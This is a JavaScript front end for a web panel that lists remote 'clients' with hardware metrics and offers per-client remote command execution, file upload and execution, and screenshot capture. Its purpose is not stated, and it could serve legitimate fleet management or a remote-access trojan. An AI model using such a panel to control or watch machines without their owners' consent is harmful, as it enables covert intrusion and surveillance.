function createTd(text, button, listener) {
	const cell = document.createElement('td')
	button ? (cell.innerHTML = `<button>${text}</button>`) : (cell.innerText = text)
	if (typeof listener === 'function') cell.addEventListener('click', listener)
	return cell
}

function populateTable(data) {
	data.forEach((item) => {
		const table = document.getElementById('clients')
		const tableBody = table.getElementsByTagName('tbody')[0]
		const row = document.createElement('tr')
		row.appendChild(createTd(item.clientId))

		const actions = ['Run Command', 'Upload file', 'Execute file', 'Open file', 'View Screen']
		actions.forEach((action) => {
			if (action == 'View Screen')
				return row.appendChild(
					createTd(action, true, () => {
						fetch('/screenshot', {
							method: 'POST',
							headers: {'Content-Type': 'application/json'},
							body: JSON.stringify({clientId: item.clientId})
						})
							.then((res) => res.json())
							.then((screenshotData) => {
								const img = document.getElementById('ss-img')
								img.src = `data:image/png;base64,${screenshotData.buffer}`
								document.getElementById('ss-container').classList.remove('hidden')
							})
							.catch((error) => console.error('Error fetching screenshot:', error))
					})
				)
			else if (action == 'Run Command') return row.appendChild(createTd(action, true, () => showCLI(item.clientId)))
			row.appendChild(createTd(action, true, () => true))
		})

		const metrics = [item.cpu.usage, item.cpu.temp, item.gpu.usage, item.gpu.temp, item.ramUsage, item.powerUsage, item.uptime]
		metrics.forEach((metric) => row.appendChild(createTd(metric)))

		tableBody.appendChild(row)
	})
}
fetch('/clients')
	.then((res) => res.json())
	.then((res) => populateTable(res))

document.getElementById('close').addEventListener('click', () => document.getElementById('ss-container').classList.add('hidden'))
document.getElementById('close-cli').addEventListener('click', () => document.getElementById('cli').classList.add('hidden'))


function showCLI(clientId) {
	const cliInput = document.getElementById('cli-input')
	const outputDiv = document.getElementById('output')
	const cliPrefix = document.getElementById('cli-prefix')

	document.getElementById('cli').classList.remove('hidden')
	cliPrefix.textContent = `${clientId}> `
	
	cliInput.addEventListener('keydown', async (event) => {
		if (event.key === 'Enter') {
			const command = cliInput.value.trim()
			if (command == 'cls' || command == 'clear') {
				outputDiv.innerHTML = ''
				cliInput.value = ''
				return
			}
			if (command !== '') {
				displayCommand(command)
				await sendCommand(command)
				cliInput.value = ''
			}
		}
	})

	function displayCommand(command) {
		const commandLine = document.createElement('div')
		commandLine.textContent = `${cliPrefix.textContent} ${command}`
		outputDiv.appendChild(commandLine)
		outputDiv.scrollTop = outputDiv.scrollHeight
		scrollToBottom()
	}

	async function sendCommand(command) {
		try {
			const response = await fetch('/command', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({command, clientId})
			})
			const data = await response.json()
			if (data.stderr) displayOutput(data.stderr)
			else displayOutput(data.stdout)
		} catch (error) {
			displayOutput('Error: Unable to send command')
		}
	}

    function displayOutput(output) {
        const formattedOutput = output.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\r\n/g, '<br>')
        const outputLine = document.createElement('div');
        outputLine.innerHTML = formattedOutput;
        outputDiv.appendChild(outputLine);
		scrollToBottom()
    }
	function scrollToBottom() {
		const cli = document.getElementById('cli-container')
		cli.scrollTop = cli.scrollHeight
	}
}
